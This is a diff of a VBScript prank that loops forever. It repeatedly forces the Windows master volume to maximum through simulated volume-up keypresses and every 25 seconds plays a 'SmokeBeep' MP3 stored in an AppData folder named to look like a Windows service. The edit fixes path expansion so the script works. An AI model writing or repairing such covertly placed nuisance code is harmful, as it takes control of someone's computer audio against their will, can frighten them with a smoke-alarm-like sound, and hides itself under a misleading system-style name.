@@ -1,30 +1,27 @@
 Option Explicit
 
-Dim objShell, player, i
+Dim objShell, player, i, mp3Path
 Set objShell = CreateObject("WScript.Shell")
-
-' Create WMP player once and reuse
 Set player = CreateObject("WMPlayer.OCX")
 
-' Path to your MP3 (change if needed)
-Const mp3Path = "%APPDATA%\WindowsServiceProvider4\SmokeBeep.MP3"
+mp3Path = objShell.ExpandEnvironmentStrings("%APPDATA%\WindowsServiceProvider4\SmokeBeep.MP3")
 
 Do
-    ' --- Step 1: Force master volume to maximum by simulating many volume-up key presses ---
+    ' --- Step 1: Set system volume to max ---
     For i = 1 To 55
-        objShell.SendKeys(chr(175))  ' volume up key
+        objShell.SendKeys chr(175)
     Next
 
-    ' --- Step 2: Ensure WMP internal volume is full, stop any previous playback, then play ---
+    ' --- Step 2: Play MP3 ---
     On Error Resume Next
     player.controls.stop
     On Error GoTo 0
 
     player.settings.volume = 100
     player.URL = mp3Path
-    player.Controls.play
+    player.controls.play
 
-    ' --- Step 3: Wait 25 seconds before repeating (25000 ms) ---
+    ' Wait 25 seconds
     WScript.Sleep 25000
-
 Loop
+
